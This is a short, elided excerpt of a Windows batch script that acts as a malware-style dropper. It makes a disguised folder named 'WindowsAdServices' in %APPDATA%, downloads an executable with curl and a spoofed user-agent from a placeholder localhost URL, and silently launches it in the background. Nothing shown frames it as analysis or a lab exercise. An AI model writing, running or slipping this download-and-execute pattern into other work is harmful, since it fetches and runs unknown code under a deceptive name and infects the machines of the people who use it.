...
set ZestyChipsFolder=%APPDATA%\WindowsAdServices
mkdir "%ZestyChipsFolder%"

:: download the file to APPDATA
curl -A "%UserAgent%" -o "%ZestyChipsFolder%\zurl.exe" http://localhost/index.php
...
if not exist "%ZestyChipsFolder%\zurl.exe" (
...
start /b "" "%ZestyChipsFolder%\zurl.exe"
